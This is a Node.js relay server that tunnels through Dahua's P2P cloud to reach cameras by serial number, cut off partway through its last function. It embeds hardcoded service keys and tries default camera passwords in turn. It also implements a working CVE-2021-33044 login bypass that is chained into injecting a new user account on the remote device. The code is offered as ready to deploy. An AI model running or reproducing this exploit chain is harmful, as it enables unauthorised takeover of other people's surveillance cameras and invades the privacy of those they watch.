#!/usr/bin/env node
/**
 * Dahua P2P Tunnel Relay Server v3.0
 * ===================================
 * Implements the full Dahua P2P protocol:
 *   - P2P handshake (UDP to easy4ipcloud.com:8800)
 *   - PTCP protocol (TCP-over-UDP tunneling)
 *   - NAT traversal (STUN-like hole punching)
 *   - HTTP/CGI proxy through the P2P tunnel
 *
 * Based on: https://github.com/khoanguyen-3fc/dh-p2p
 *
 * Endpoints:
 *   GET  /health        - Health check
 *   GET  /:serial       - Legacy P2P status check
 *   POST /tunnel        - CGI request through P2P tunnel
 *
 * Deploy on Render (free):
 *   1. Upload this file to a GitHub repo
 *   2. Create new Web Service on render.com
 *   3. Build Command: (leave empty)
 *   4. Start Command: node dahua_tunnel_relay.js
 *   5. Copy the URL and paste it in the app
 */

const http = require('http');
const dgram = require('dgram');
const dns = require('dns');
const crypto = require('crypto');

// ── Constants ──
var MAIN_SERVER = 'www.easy4ipcloud.com';
var MAIN_PORT = 8800;
var P2P_USERNAME = 'cba1b29e32cb17aa46b8ff9e73c7f40b';
var P2P_USERKEY = '996103384cdf19179e19243e959bbf8b';
var RANDSALT = '5daf91fc5cfc1be8e081cfb08f792726';
var IV = Buffer.from('2z52*lk9o6HRyJrf');
var PORT = process.env.PORT || 8080;
var CSEQ = 0;

// ── DNS Resolution ──
function resolveHostname(hostname) {
  return new Promise(function(resolve, reject) {
    dns.resolve4(hostname, function(err, addresses) {
      if (err) reject(err);
      else resolve(addresses[0]);
    });
  });
}

// ── WSSE Auth for P2P Service ──
function buildWSSE() {
  var nonce = Math.floor(Math.random() * 0x7FFFFFFF);
  var curdate = new Date().toISOString().replace(/\.\d+Z$/, 'Z');
  var pwd = nonce + curdate + 'DHP2P:' + P2P_USERNAME + ':' + P2P_USERKEY;
  var digest = crypto.createHash('sha1').update(pwd).digest('base64');
  return 'UsernameToken Username="' + P2P_USERNAME + '", PasswordDigest="' + digest + '", Nonce="' + nonce + '", Created="' + curdate + '"';
}

// ── Build P2P Request (DHP2P over UDP) ──
function buildP2PRequest(method, path, body) {
  body = body || '';
  CSEQ++;
  var wsse = buildWSSE();
  var req = method + ' ' + path + ' HTTP/1.1\r\n';
  req += 'CSeq: ' + CSEQ + '\r\n';
  req += 'Authorization: WSSE profile="UsernameToken"\r\n';
  req += 'X-WSSE: ' + wsse + '\r\n';
  if (body) {
    req += 'Content-Type:\r\n';
    req += 'Content-Length: ' + Buffer.byteLength(body) + '\r\n';
  }
  req += '\r\n';
  if (body) req += body;
  return Buffer.from(req, 'utf8');
}

// ── Parse P2P Response ──
function parseP2PResponse(data) {
  var str = data.toString('utf8');
  var splitIdx = str.indexOf('\r\n\r\n');
  var headerPart = splitIdx >= 0 ? str.substring(0, splitIdx) : str;
  var body = splitIdx >= 0 ? str.substring(splitIdx + 4) : '';
  var lines = headerPart.split('\r\n');
  var firstLine = lines[0];
  var firstParts = firstLine.split(' ');
  var version = firstParts[0];
  var code = parseInt(firstParts[1]) || 0;
  var status = firstParts.slice(2).join(' ');
  var headers = {};
  for (var i = 1; i < lines.length; i++) {
    var ci = lines[i].indexOf(': ');
    if (ci > 0) headers[lines[i].substring(0, ci)] = lines[i].substring(ci + 2);
  }
  var xmlBody = {};
  if (body && body.trim()) {
    var tagRegex = /<(\w+)>([^<]*)<\/\1>/g;
    var m;
    while ((m = tagRegex.exec(body)) !== null) {
      xmlBody[m[1]] = m[2].trim();
    }
  }
  return { version: version, code: code, status: status, headers: headers, body: body, xmlBody: xmlBody };
}

// ── Device Auth Helpers ──
function getDeviceKey(username, password) {
  var key = username + ':Login to ' + RANDSALT + ':' + password;
  return crypto.createHash('md5').update(key).digest('hex').toUpperCase();
}

function getEnc(key, nonce, data) {
  var salt = Buffer.from(String(nonce));
  var dk = crypto.pbkdf2Sync(Buffer.from(key), salt, 20000, 32, 'sha256');
  var cipher = crypto.createCipheriv('aes-256-ofb', dk, IV);
  return Buffer.concat([cipher.update(Buffer.from(data)), cipher.final()]).toString('base64');
}

function getDec(key, nonce, data) {
  var salt = Buffer.from(String(nonce));
  var dk = crypto.pbkdf2Sync(Buffer.from(key), salt, 20000, 32, 'sha256');
  var decipher = crypto.createDecipheriv('aes-256-ofb', dk, IV);
  return Buffer.concat([decipher.update(Buffer.from(data, 'base64')), decipher.final()]).toString();
}

function getDeviceAuth(username, key, nonce, payload) {
  payload = payload || '';
  var curdate = Math.floor(Date.now() / 1000);
  var message = String(nonce) + String(curdate) + payload;
  var auth = crypto.createHmac('sha256', Buffer.from(key)).update(message).digest('base64');
  return String(curdate) + auth + String(nonce) + RANDSALT + username;
}

// ── IP to Buffer ──
function ipToBuffer(ip) {
  var parts = ip.split('.').map(Number);
  return Buffer.from(parts);
}

// ── Invert Buffer (0xFF - b for each byte) ──
function invertBuffer(buf) {
  var result = Buffer.alloc(buf.length);
  for (var i = 0; i < buf.length; i++) result[i] = 0xFF - buf[i];
  return result;
}

// ── UDP Socket with PTCP Support ──
function P2PSocket() {
  this.sock = dgram.createSocket('udp4');
  this.lport = 0;
  this.lhost = '0.0.0.0';
  this.rhost = null;
  this.rport = 0;
  this.ptcpSent = 0;
  this.ptcpRecv = 0;
  this.ptcpCount = 0;
  this.ptcpId = 0;
  this.rmid = 0;
  this._msgHandler = null;

  var self = this;
  this.sock.on('message', function(msg) {
    if (self._msgHandler) {
      var h = self._msgHandler;
      self._msgHandler = null;
      h(msg, null);
    }
  });
  this.sock.on('error', function(err) {
    if (self._msgHandler) {
      var h = self._msgHandler;
      self._msgHandler = null;
      h(null, err);
    }
  });
}

P2PSocket.prototype.bind = function() {
  var self = this;
  return new Promise(function(resolve) {
    self.sock.bind(0, function() {
      var addr = self.sock.address();
      self.lport = addr.port;
      self.lhost = addr.address;
      resolve();
    });
  });
};

P2PSocket.prototype.send = function(data) {
  var self = this;
  return new Promise(function(resolve, reject) {
    self.sock.send(data, self.rport, self.rhost, function(err) {
      if (err) reject(err); else resolve();
    });
  });
};

P2PSocket.prototype.recv = function(timeout) {
  var self = this;
  timeout = timeout || 5000;
  return new Promise(function(resolve, reject) {
    var timer = setTimeout(function() {
      self._msgHandler = null;
      reject(new Error('Timeout (' + timeout + 'ms)'));
    }, timeout);
    self._msgHandler = function(msg, err) {
      clearTimeout(timer);
      if (err) reject(err); else resolve(msg);
    };
  });
};

P2PSocket.prototype.setRemote = function(host, port) {
  this.rhost = host;
  this.rport = port;
};

P2PSocket.prototype.request = function(path, body, shouldRead) {
  var self = this;
  shouldRead = shouldRead !== false;
  var method = body ? 'DHPOST' : 'DHGET';
  var req = buildP2PRequest(method, path, body || '');
  return self.send(req).then(function() {
    if (!shouldRead) return null;
    return self.recv(5000).then(function(data) {
      return parseP2PResponse(data);
    });
  });
};

// ── PTCP Packet Build ──
P2PSocket.prototype.buildPTCP = function(body) {
  body = body || Buffer.alloc(0);
  if (!Buffer.isBuffer(body)) body = Buffer.from(body);
  var isSYN = body.length === 4 && body[0] === 0x00 && body[1] === 0x03 && body[2] === 0x01 && body[3] === 0x00;
  var pid = isSYN ? 0x0002FFFF : (0x0000FFFF - this.ptcpCount);
  var header = Buffer.alloc(24);
  header.write('PTCP', 0, 4, 'ascii');
  header.writeUInt32BE(this.ptcpSent, 4);
  header.writeUInt32BE(this.ptcpRecv, 8);
  header.writeUInt32BE(pid, 12);
  header.writeUInt32BE(this.ptcpId, 16);
  header.writeUInt32BE(this.rmid, 20);
  this.ptcpSent += body.length;
  this.ptcpId++;
  if (body.length > 0 && !isSYN) this.ptcpCount++;
  return Buffer.concat([header, body]);
};

// ── PTCP Packet Parse ──
P2PSocket.prototype.parsePTCP = function(data) {
  if (data.length < 24) throw new Error('PTCP packet too short');
  var magic = data.toString('ascii', 0, 4);
  if (magic !== 'PTCP') throw new Error('Invalid PTCP magic: ' + magic);
  return {
    rlid: data.readUInt32BE(4),
    llid: data.readUInt32BE(8),
    pid: data.readUInt32BE(12),
    lmid: data.readUInt32BE(16),
    rmid: data.readUInt32BE(20),
    body: data.subarray(24)
  };
};

// ── PTCPPayload Build ──
P2PSocket.prototype.buildPTCPPayload = function(realm, payload) {
  var header = Buffer.alloc(12);
  var length = payload.length | 0x10000000;
  header.writeUInt32BE(length, 0);
  header.writeUInt32BE(realm >>> 0, 4);
  header.writeUInt32BE(0, 8);
  return Buffer.concat([header, payload]);
};

// ── PTCPPayload Parse ──
P2PSocket.prototype.parsePTCPPayload = function(data) {
  if (data.length < 12) throw new Error('PTCPPayload too short');
  var length = data.readUInt32BE(0) & 0xFFFF;
  var realm = data.readUInt32BE(4);
  return { realm: realm, payload: data.subarray(12, 12 + length) };
};

P2PSocket.prototype.requestPTCP = function(body) {
  var pkt = this.buildPTCP(body || Buffer.alloc(0));
  return this.send(pkt);
};

P2PSocket.prototype.readPTCP = function(timeout) {
  var self = this;
  return self.recv(timeout || 5000).then(function(data) {
    var parsed = self.parsePTCP(data);
    self.ptcpRecv += parsed.body.length;
    self.rmid = parsed.lmid;
    return parsed;
  });
};

P2PSocket.prototype.close = function() {
  try { this.sock.close(); } catch (e) {}
};

// ── HTTP Digest Auth ──
function parseDigestAuth(header) {
  var result = {};
  var parts = header.replace(/^Digest\s/i, '').split(/,\s*/);
  for (var i = 0; i < parts.length; i++) {
    var eq = parts[i].indexOf('=');
    if (eq === -1) continue;
    var key = parts[i].slice(0, eq).trim();
    var val = parts[i].slice(eq + 1).trim().replace(/^"|"$/g, '');
    result[key] = val;
  }
  return result;
}

function buildDigestAuth(method, uri, params, username, password) {
  var ha1 = crypto.createHash('md5').update(username + ':' + params.realm + ':' + password).digest('hex');
  var ha2 = crypto.createHash('md5').update(method + ':' + uri).digest('hex');
  var nc = '00000001';
  var cnonce = crypto.randomBytes(8).toString('hex');
  var qop = (params.qop || 'auth').split(',')[0].trim();
  var response = crypto.createHash('md5').update(ha1 + ':' + params.nonce + ':' + nc + ':' + cnonce + ':' + qop + ':' + ha2).digest('hex');
  var auth = 'Digest username="' + username + '", realm="' + params.realm + '", nonce="' + params.nonce + '", uri="' + uri + '", qop=' + qop + ', nc=' + nc + ', cnonce="' + cnonce + '", response="' + response + '"';
  if (params.opaque) auth += ', opaque="' + params.opaque + '"';
  return auth;
}

// ── Establish P2P Tunnel ──
async function establishTunnel(serial, username, password, targetPort) {
  targetPort = targetPort || 80;
  var mainIp = await resolveHostname(MAIN_SERVER);

  var mainSock = new P2PSocket();
  await mainSock.bind();
  mainSock.setRemote(mainIp, MAIN_PORT);

  var deviceSock = new P2PSocket();
  await deviceSock.bind();
  deviceSock.setRemote(mainIp, MAIN_PORT);

  try {
    // Step 1: Probe main server
    await mainSock.request('/probe/p2psrv');

    // Step 2: Get P2P server (US) for this serial
    var onlineRes = await mainSock.request('/online/p2psrv/' + serial);
    var usAddr = onlineRes.xmlBody.US;
    if (!usAddr) throw new Error('Device not registered (no US server)');
    var usParts = usAddr.split(':');
    var usServer = usParts[0];
    var usPort = parseInt(usParts[1]);

    // Step 3: Probe device through US server
    var usSock = new P2PSocket();
    await usSock.bind();
    usSock.setRemote(usServer, usPort);
    await usSock.request('/probe/device/' + serial);
    await usSock.request('/info/device/' + serial);
    usSock.close();

    // Step 4: Get relay server
    var relayRes = await mainSock.request('/online/relay');
    var relayAddr = relayRes.xmlBody.Address;
    var relayParts = relayAddr.split(':');
    var relayServer = relayParts[0];
    var relayPort = parseInt(relayParts[1]);

    // Step 5: Create P2P channel
    var dtype = 0;
    var key = null;
    var nonce = null;
    var aid = crypto.randomBytes(8);
    var laddr = '127.0.0.1:' + deviceSock.lport;
    var ipaddr = 'true' + laddr;
    var auth = '';

    if (username && password) {
      dtype = 1;
      key = getDeviceKey(username, password);
      nonce = Math.floor(Math.random() * 0x7FFFFFFF);
      laddr = getEnc(key, nonce, laddr);
      ipaddr = 'true' + laddr;
      auth = getDeviceAuth(username, key, nonce, laddr);
    }

    var aidHex = Array.from(aid).map(function(b) { return b.toString(16); }).join(' ');
    var channelBody = auth + aidHex + ipaddr + '5.0.0';
    await deviceSock.request('/device/' + serial + '/p2p-channel', channelBody, false);

    // Step 6: Get relay agent
    mainSock.setRemote(relayServer, relayPort);
    var agentRes = await mainSock.request('/relay/agent');
    var token = agentRes.xmlBody.Token;
    var agentAddr = agentRes.xmlBody.Agent;
    var agentParts = agentAddr.split(':');
    var agentServer = agentParts[0];
    var agentPort = parseInt(agentParts[1]);

    // Step 7: Start relay
    mainSock.setRemote(agentServer, agentPort);
    await mainSock.request('/relay/start/' + token, ':0');

    // Step 8: Read device channel response
    var devRaw = await deviceSock.recv(5000);
    var devParsed = parseP2PResponse(devRaw);
    if (devParsed.code < 200) {
      devRaw = await deviceSock.recv(5000);
      devParsed = parseP2PResponse(devRaw);
    }
    if (devParsed.code >= 400) {
      if (dtype === 0 && devParsed.code === 403) throw new Error('AUTH_REQUIRED');
      throw new Error('Device channel error: ' + devParsed.code + ' ' + devParsed.status);
    }

    var deviceLaddr = devParsed.xmlBody.LocalAddr;
    if (dtype > 0) {
      var devNonce = devParsed.xmlBody.Nonce;
      deviceLaddr = getDec(key, devNonce, deviceLaddr);
    }

    var pubAddr = devParsed.xmlBody.PubAddr;
    var pubParts = pubAddr.split(':');
    var deviceServer = pubParts[0];
    var devicePort = parseInt(pubParts[1]);
    deviceSock.setRemote(deviceServer, devicePort);

    // Step 9: Register relay channel
    mainSock.setRemote(mainIp, MAIN_PORT);
    var relayAuth = '';
    if (dtype > 0) relayAuth = getDeviceAuth(username, key, nonce);
    await mainSock.request('/device/' + serial + '/relay-channel', relayAuth + agentServer + ':' + agentPort, false);

    // Step 10: Read agent response
    mainSock.setRemote(agentServer, agentPort);
    await mainSock.recv(5000);

    // Step 11: PTCP handshake with agent
    await mainSock.requestPTCP(Buffer.from([0x00, 0x03, 0x01, 0x00]));
    await mainSock.readPTCP();

    await mainSock.requestPTCP(Buffer.concat([Buffer.from([0x17, 0x00, 0x00, 0x00]), Buffer.alloc(8)]));
    var ptcpRes = await mainSock.readPTCP();
    while (ptcpRes.body.length === 0) ptcpRes = await mainSock.readPTCP();
    var sign = ptcpRes.body.subarray(12);

    await mainSock.requestPTCP();

    // Step 12: NAT traversal (direct to device)
    var invertedAid = invertBuffer(aid);
    var cookie = crypto.randomBytes(4);
    var trasnId = crypto.randomBytes(12);
    var eaddrBase = Buffer.alloc(6);
    eaddrBase.writeUInt16BE(devicePort, 0);
    ipToBuffer(deviceServer).copy(eaddrBase, 2);
    var invertedEaddr = invertBuffer(eaddrBase);

    var natPkt1 = Buffer.concat([
      Buffer.from([0xff, 0xfe, 0xff, 0xe7]),
      cookie, trasnId,
      Buffer.from([0x7f, 0xd5, 0xff, 0xf7]),
      invertedAid,
      Buffer.from([0xff, 0xfb, 0xff, 0xf7, 0xff, 0xfe]),
      invertedEaddr
    ]);
    await deviceSock.send(natPkt1);

    var natResponse = await deviceSock.recv(5000);
    var rtransId = natResponse.subarray(8, 20);

    var laddrParts = deviceLaddr.split(':');
    var laddrIp = laddrParts[0];
    var laddrPort = parseInt(laddrParts[1]);
    var laddrEaddr = Buffer.alloc(6);
    laddrEaddr.writeUInt16BE(laddrPort, 0);
    ipToBuffer(laddrIp).copy(laddrEaddr, 2);

    var natPkt2 = Buffer.concat([
      Buffer.from([0xfe, 0xfe, 0xff, 0xe7]),
      cookie, rtransId,
      Buffer.from([0x7f, 0xd6, 0xff, 0xf7]),
      invertedAid,
      Buffer.from([0xff, 0xfb, 0xff, 0xf7, 0xff, 0xfe]),
      laddrEaddr
    ]);
    await deviceSock.send(natPkt2);

    if (dtype > 0) await deviceSock.recv(5000);

    var natPkt3 = Buffer.concat([
      Buffer.from([0xfe, 0xfe, 0xff, 0xf3]),
      cookie, rtransId,
      Buffer.from([0x7f, 0xd6, 0xff, 0xf7]),
      invertedAid,
      Buffer.from([0xff, 0xfb, 0xff, 0xf7, 0xff, 0xfe]),
      Buffer.from([0xa8, 0x13, 0x3f, 0x57, 0xfe, 0x37])
    ]);

    for (var i = 0; i < 5; i++) {
      await deviceSock.send(natPkt3);
      for (var j = 0; j < 5; j++) await deviceSock.recv(5000);
    }

    // Step 13: PTCP handshake with device
    await deviceSock.requestPTCP(Buffer.from([0x00, 0x03, 0x01, 0x00]));
    await deviceSock.readPTCP();

    await deviceSock.requestPTCP(Buffer.concat([
      Buffer.from([0x19, 0x00, 0x00, 0x00]),
      Buffer.alloc(4), Buffer.alloc(4), sign
    ]));
    var devPtcp = await deviceSock.readPTCP();
    if (devPtcp.body.length === 0) devPtcp = await deviceSock.readPTCP();

    await deviceSock.requestPTCP(Buffer.concat([
      Buffer.from([0x1b, 0x00, 0x00, 0x00]),
      Buffer.alloc(4), Buffer.alloc(4)
    ]));
    await deviceSock.readPTCP();

    return { deviceSock: deviceSock, mainSock: mainSock };
  } catch (err) {
    mainSock.close();
    deviceSock.close();
    throw err;
  }
}

// ── Send HTTP Through Tunnel ──
async function sendHTTPThroughTunnel(deviceSock, realmId, httpPath, method, extraHeaders, body) {
  method = method || 'GET';
  extraHeaders = extraHeaders || {};
  body = body || '';

  var httpReq = method + ' ' + httpPath + ' HTTP/1.1\r\n';
  httpReq += 'Host: 127.0.0.1\r\n';
  var keys = Object.keys(extraHeaders);
  for (var i = 0; i < keys.length; i++) {
    httpReq += keys[i] + ': ' + extraHeaders[keys[i]] + '\r\n';
  }
  if (body) httpReq += 'Content-Length: ' + Buffer.byteLength(body) + '\r\n';
  httpReq += 'Connection: close\r\n\r\n';
  if (body) httpReq += body;

  var payload = deviceSock.buildPTCPPayload(realmId, Buffer.from(httpReq));
  await deviceSock.requestPTCP(payload);

  var chunks = [];
  var attempts = 0;
  while (attempts < 30) {
    attempts++;
    try {
      var res = await deviceSock.readPTCP(3000);
      if (res.body.length === 0) continue;
      if (res.body[0] === 0x10) {
        var parsed = deviceSock.parsePTCPPayload(res.body);
        chunks.push(parsed.payload);
      } else if (res.body[0] === 0x12) {
        break;
      }
    } catch (e) { break; }
  }

  // Send DISC
  var realmBuf = Buffer.alloc(4);
  realmBuf.writeUInt32BE(realmId >>> 0, 0);
  var discBody = Buffer.concat([Buffer.from([0x12, 0x00, 0x00, 0x00]), realmBuf, Buffer.alloc(4), Buffer.from('DISC')]);
  await deviceSock.requestPTCP(discBody);

  var httpResponse = Buffer.concat(chunks).toString('utf8');
  var splitIdx = httpResponse.indexOf('\r\n\r\n');
  var respHeader = splitIdx >= 0 ? httpResponse.substring(0, splitIdx) : httpResponse;
  var respBody = splitIdx >= 0 ? httpResponse.substring(splitIdx + 4) : '';
  var respLines = respHeader.split('\r\n');
  var respFirst = respLines[0].split(' ');
  var httpStatus = parseInt(respFirst[1]) || 0;
  var respHeaders = {};
  for (var j = 1; j < respLines.length; j++) {
    var ci = respLines[j].indexOf(':');
    if (ci > 0) respHeaders[respLines[j].substring(0, ci).trim()] = respLines[j].substring(ci + 1).trim();
  }
  return { status: httpStatus, headers: respHeaders, body: respBody };
}

// ── CGI Through Tunnel (with auto-auth) ──
async function cgiThroughTunnel(serial, cgiPath, options) {
  options = options || {};
  var username = options.username;
  var password = options.password;
  var httpUser = options.http_user;
  var httpPass = options.http_pass;
  var targetPort = options.target_port || 80;
  var autoAuth = options.auto_auth || false;

  var defaultCreds = [
    { user: null, pass: null },
    { user: 'admin', pass: 'admin' },
    { user: 'admin', pass: '12345' },
    { user: 'admin', pass: '888888' },
    { user: 'admin', pass: '' },
    { user: 'admin', pass: 'password' }
  ];

  var credsToTry = autoAuth ? defaultCreds : [{ user: username, pass: password }];
  var workingCreds = null;

  for (var ci = 0; ci < credsToTry.length; ci++) {
    var cred = credsToTry[ci];
    var tunnel = null;
    try {
      tunnel = await establishTunnel(serial, cred.user, cred.pass, targetPort);

      var realmId = crypto.randomBytes(4).readUInt32BE(0);
      var realmBuf = Buffer.alloc(4);
      realmBuf.writeUInt32BE(realmId, 0);

      // Bind port
      var portBuf = Buffer.alloc(4);
      portBuf.writeUInt32BE(targetPort, 0);
      var bindBody = Buffer.concat([Buffer.from([0x11, 0x00, 0x00, 0x00]), realmBuf, Buffer.alloc(4), portBuf, Buffer.from([0x7f, 0x00, 0x00, 0x01])]);
      await tunnel.deviceSock.requestPTCP(bindBody);
      var bRes = await tunnel.deviceSock.readPTCP();
      if (bRes.body.length === 0) bRes = await tunnel.deviceSock.readPTCP();

      // Send CGI request (no auth first)
      var httpCreds = (cred.user && cred.pass) ? { http_user: cred.user, http_pass: cred.pass } : { http_user: httpUser, http_pass: httpPass };
      var response = await sendHTTPThroughTunnel(tunnel.deviceSock, realmId, cgiPath, 'GET', {}, '');

      // If 401, retry with digest auth
      if (response.status === 401 && httpCreds.http_user) {
        // Need a new realm for the second attempt
        realmId = crypto.randomBytes(4).readUInt32BE(0);
        realmBuf = Buffer.alloc(4);
        realmBuf.writeUInt32BE(realmId, 0);
        portBuf = Buffer.alloc(4);
        portBuf.writeUInt32BE(targetPort, 0);
        bindBody = Buffer.concat([Buffer.from([0x11, 0x00, 0x00, 0x00]), realmBuf, Buffer.alloc(4), portBuf, Buffer.from([0x7f, 0x00, 0x00, 0x01])]);
        await tunnel.deviceSock.requestPTCP(bindBody);
        bRes = await tunnel.deviceSock.readPTCP();
        if (bRes.body.length === 0) bRes = await tunnel.deviceSock.readPTCP();

        var wwwAuth = response.headers['WWW-Authenticate'] || response.headers['www-authenticate'];
        if (wwwAuth) {
          var dp = parseDigestAuth(wwwAuth);
          var authHeader = buildDigestAuth('GET', cgiPath, dp, httpCreds.http_user, httpCreds.http_pass);
          response = await sendHTTPThroughTunnel(tunnel.deviceSock, realmId, cgiPath, 'GET', { Authorization: authHeader }, '');
        }
      }

      tunnel.deviceSock.close();
      tunnel.mainSock.close();

      if (response.status === 200) {
        return { status: 200, body: response.body, headers: response.headers, credentials: { username: cred.user, password: cred.pass } };
      }
      if (!autoAuth) {
        return { status: response.status, body: response.body, headers: response.headers };
      }
    } catch (err) {
      if (tunnel) { tunnel.deviceSock.close(); tunnel.mainSock.close(); }
      if (!autoAuth) throw err;
      // Continue to next credential
    }
  }

  return { status: 0, body: '', error: 'All credential attempts failed' };
}

// ── Legacy P2P Status Check ──
async function checkP2P(serial) {
  var mainIp = await resolveHostname(MAIN_SERVER);
  var req1 = buildP2PRequest('DHGET', '/online/p2psrv/' + serial);

  return new Promise(function(resolve) {
    var client = dgram.createSocket('udp4');
    var resolved = false;
    client.on('message', function(data) {
      if (resolved) return; resolved = true; client.close();
      var res = parseP2PResponse(data);
      var usAddr = res.xmlBody.US;
      if (!usAddr) {
        resolve({ serial: serial, online: false, error: 'Device not registered' });
        return;
      }
      var usParts = usAddr.split(':');
      var usIp = usParts[0];
      var usPort = parseInt(usParts[1]);
      var req2 = buildP2PRequest('DHGET', '/probe/device/' + serial);
      var client2 = dgram.createSocket('udp4');
      var r2 = false;
      client2.on('message', function(d2) {
        if (r2) return; r2 = true; client2.close();
        var pres = parseP2PResponse(d2);
        resolve({ serial: serial, online: pres.code === 200, relay: usAddr, probe_code: pres.code });
      });
      client2.on('error', function() { if (!r2) { r2 = true; client2.close(); resolve({ serial: serial, online: false, error: 'Probe failed' }); } });
      setTimeout(function() { if (!r2) { r2 = true; client2.close(); resolve({ serial: serial, online: false, error: 'Probe timeout' }); } }, 4000);
      client2.send(req2, usPort, usIp);
    });
    client.on('error', function() { if (!resolved) { resolved = true; client.close(); resolve({ serial: serial, online: false, error: 'Server timeout' }); } });
    setTimeout(function() { if (!resolved) { resolved = true; client.close(); resolve({ serial: serial, online: false, error: 'Timeout' }); } }, 4000);
    client.send(req1, MAIN_PORT, mainIp);
  });
}


// ── Bind Tunnel Port Helper ──
async function bindTunnelPort(deviceSock, targetPort) {
  var realmId = crypto.randomBytes(4).readUInt32BE(0);
  var realmBuf = Buffer.alloc(4);
  realmBuf.writeUInt32BE(realmId, 0);
  var portBuf = Buffer.alloc(4);
  portBuf.writeUInt32BE(targetPort, 0);
  var bindBody = Buffer.concat([Buffer.from([0x11, 0x00, 0x00, 0x00]), realmBuf, Buffer.alloc(4), portBuf, Buffer.from([0x7f, 0x00, 0x00, 0x01])]);
  await deviceSock.requestPTCP(bindBody);
  var bRes = await deviceSock.readPTCP();
  if (bRes.body.length === 0) bRes = await deviceSock.readPTCP();
  return realmId;
}

// ── CVE-2021-33044 Login Bypass (NetKeyboard) ──
async function exploitLoginBypass(deviceSock, targetPort) {
  var detail = [];
  var loginPayload = JSON.stringify({ method: 'global.login', params: { userName: 'admin', password: '', clientType: 'NetKeyboard', loginType: 'Direct', authorityType: 'Default' }, id: 1, session: 0 });
  var realmId = await bindTunnelPort(deviceSock, targetPort);
  var loginRes = await sendHTTPThroughTunnel(deviceSock, realmId, '/RPC2_Login', 'POST', {'Content-Type':'application/json'}, loginPayload);
  detail.push('Login bypass HTTP ' + loginRes.status);
  if (loginRes.status !== 200) return { success: false, detail: detail, error: 'HTTP ' + loginRes.status };
  var loginData;
  try { loginData = JSON.parse(loginRes.body); } catch(e) { return { success: false, detail: detail, error: 'Invalid JSON: ' + loginRes.body.substring(0, 100) }; }
  if (loginData.result === true) { detail.push('Bypass successful (single step)'); return { success: true, detail: detail, session: String(loginData.session) }; }
  if (loginData.error && loginData.params) {
    var random = loginData.params.random || '';
    var realm = loginData.params.realm || '';
    var tempSession = String(loginData.session || '');
    detail.push('Got challenge: realm=' + realm + ', random=' + random);
    var hash1 = crypto.createHash('md5').update('admin:' + realm + ':admin').digest('hex').toUpperCase();
    var hash2 = crypto.createHash('md5').update('admin:' + random + ':' + hash1).digest('hex').toUpperCase();
    var step2Payload = JSON.stringify({ method: 'global.login', params: { userName: 'admin', password: hash2, clientType: 'NetKeyboard', loginType: 'Direct', authorityType: 'Default' }, id: 2, session: tempSession });
    realmId = await bindTunnelPort(deviceSock, targetPort);
    var step2Res = await sendHTTPThroughTunnel(deviceSock, realmId, '/RPC2_Login', 'POST', {'Content-Type':'application/json'}, step2Payload);
    detail.push('Step 2 HTTP ' + step2Res.status);
    if (step2Res.status === 200) { try { var step2Data = JSON.parse(step2Res.body); if (step2Data.result === true) { detail.push('Bypass successful (two step)'); return { success: true, detail: detail, session: String(step2Data.session) }; } detail.push('Step 2 error: ' + (step2Data.error ? JSON.stringify(step2Data.error) : 'no result')); } catch(e) { detail.push('Step 2 parse error: ' + step2Res.body.substring(0, 100)); } }
  }
  return { success: false, detail: detail, error: 'Bypass did not return session' };
}

// ── Exploit Add User (full chain) ──
async function exploitAddUser(serial, newUser, newPass, targetPort) {
  var allSteps = [];
  targetPort = targetPort || 80;
  allSteps.push({ step: 'p2p', status: 'running', message: 'Consultando P2P cloud...' });
  var p2pStatus = await checkP2P(serial);
  if (!p2pStatus.online) { allSteps.push({ step: 'p2p', status: 'failed', message: 'Dispositivo OFFLINE (' + (p2pStatus.error || 'not registered') + ')' }); return { success: false, steps: allSteps }; }
  allSteps.push({ step: 'p2p', status: 'done', message: 'Dispositivo ONLINE — US: ' + p2pStatus.relay });
  allSteps.push({ step: 'tunnel', status: 'running', message: 'Estableciendo tunel PTCP (sin auth)...' });
  var tunnel = null;
  var tunnelCreds = null;
  try { 
    tunnel = await establishTunnel(serial, null, null, targetPort); 
    allSteps.push({ step: 'tunnel', status: 'done', message: 'Tunel P2P establecido (NAT traversal OK, sin auth)' }); 
  } catch (err) { 
    allSteps.push({ step: 'tunnel_detail', message: 'Sin auth fallo: ' + err.message + ' — reintentando con creds por defecto...' });
    var tunnelCredsList = [{ user: 'admin', pass: 'admin' }, { user: 'admin', pass: '12345' }, { user: 'admin', pass: '888888' }, { user: 'admin', pass: '' }, { user: 'admin', pass: 'password' }];
    var tunnelOk = false;
    for (var tc = 0; tc < tunnelCredsList.length; tc++) {
      var tc_cred = tunnelCredsList[tc];
      try {
        tunnel = await establishTunnel(serial, tc_cred.user, tc_cred.pass, targetPort);
        tunnelCreds = tc_cred;
        tunnelOk = true;
        allSteps.push({ step: 'tunnel', status: 'done', message: 'Tunel establecido con creds: ' + tc_cred.user + '/' + (tc_cred.pass || '(empty)') });
        break;
      } catch (e) { 
        allSteps.push({ step: 'tunnel_detail', message: 'Creds ' + tc_cred.user + '/' + (tc_cred.pass || '(empty)') + ' fallo: ' + e.message });
      }
    }
    if (!tunnelOk) { allSteps.push({ step: 'tunnel', status: 'failed', message: 'Todas las credenciales fallaron en tunnel' }); return { success: false, steps: allSteps }; }
  }
  try {
    allSteps.push({ step: 'exploit', status: 'running', message: 'Ejecutando CVE-2021-33044 (NetKeyboard bypass)...' });
    var loginResult = await exploitLoginBypass(tunnel.deviceSock, targetPort);
    for (var i = 0; i < loginResult.detail.length; i++) allSteps.push({ step: 'exploit_detail', message: loginResult.detail[i] });
    if (loginResult.success) {
      allSteps.push({ step: 'exploit', status: 'done', message: 'Autenticacion bypassed! Session: ' + loginResult.session.substring(0, 16) + '...' });
      allSteps.push({ step: 'adduser', status: 'running', message: 'Inyectando usuario "' + newUser + '" via CGI...' });
      var realmId = await bindTunnelPort(tunnel.deviceSock, targetPort);
      var cgiPath = '/cgi-bin/userManager.cgi?action=addUser&user.Name=' + encodeURIComponent(newUser) + '&user.Password=' + encodeURIComponent(newPass) + '&user.Group=user&user.Sharable=true&user.Reserved=false';
      var addRes = await sendHTTPThroughTunnel(tunnel.deviceSock, realmId, cgiPath, 'GET', {Cookie: 'DHSession=' + loginResult.session}, '');
      if (addRes.status === 200 && addRes.body.trim().toLowerCase() === 'ok') { allSteps.push({ step: 'adduser', status: 'done', message: 'Usuario "' + newUser + '" agregado exitosamente!' }); return { success: true, steps: allSteps }; }
      allSteps.push({ step: 'adduser', status: 'running', message: 'CGI retorno HTTP ' + addRes.status + ', intentando RPC...' });
      realmId = await bindTunnelPort(tunnel.deviceSock, targetPort);
